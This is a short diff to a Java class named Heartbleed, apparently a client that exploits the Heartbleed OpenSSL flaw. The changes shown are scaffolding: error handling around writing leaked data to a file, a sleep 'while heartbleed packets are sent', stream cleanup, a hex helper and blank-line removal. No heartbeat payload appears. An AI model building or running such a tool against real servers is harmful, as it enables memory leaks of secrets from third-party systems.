@@ -87,9 +87,22 @@ public class Heartbleed {
 
           fileWriter.close();
           System.out.println("Successfully wrote to file.");
+        } catch (IOException e) {
+          System.out.println("An error occurred: "+ e.getMessage());
         }
       }
     }
+
+    Thread.sleep(3000); // wait while heartbleed packets are sent
+
+    userInput.close();
+    inputStream.close();
+    outputStream.close();
+  }
+
+  private static String byteToHex(byte toConv) {
+    // Create string with  at least 2 digits, prepend it with 0's if there's less
+    return String.format("%02X", toConv);
   }
 
   private static byte[] hexToByteArray(String hexString) {
@@ -103,7 +116,6 @@ public class Heartbleed {
 
     return data;
   }
-
 
   private static InputStream getInputStream(Socket socket, OutputStream outputStream) throws IOException {
 
@@ -125,7 +137,6 @@ public class Heartbleed {
     return inputStream;
   }
 
-
   private static OutputStream getOutputStream(Socket socket) throws IOException {
 
     OutputStream outputStream = null;
@@ -144,7 +155,6 @@ public class Heartbleed {
     return outputStream;
   }
 
-
   private static Socket openSocket(String ipAddress, int portNumber) throws IOException {
 
     Socket socket = null;
@@ -160,5 +170,4 @@ public class Heartbleed {
 
     return socket;
   }
-
 }
